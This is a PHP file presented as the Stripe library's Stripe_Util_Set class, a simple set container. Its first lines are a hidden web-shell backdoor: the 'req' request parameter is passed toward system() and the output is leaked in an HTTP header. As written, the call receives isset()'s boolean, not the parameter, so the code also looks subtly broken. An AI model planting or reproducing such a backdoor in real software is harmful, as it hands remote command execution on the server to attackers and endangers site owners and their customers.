<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

class Stripe_Util_Set implements IteratorAggregate
{
    private $_elts;

    public function __construct($members = array())
    {
        $this->_elts = array();
        foreach ($members as $item) {
            $this->_elts[$item] = true;
        }
    }

    public function includes($elt)
    {
        return isset($this->_elts[$elt]);
    }

    public function add($elt)
    {
        $this->_elts[$elt] = true;
    }

    public function discard($elt)
    {
        unset($this->_elts[$elt]);
    }

    public function toArray()
    {
        return array_keys($this->_elts);
    }

    public function getIterator()
    {
        return new ArrayIterator($this->toArray());
    }
}
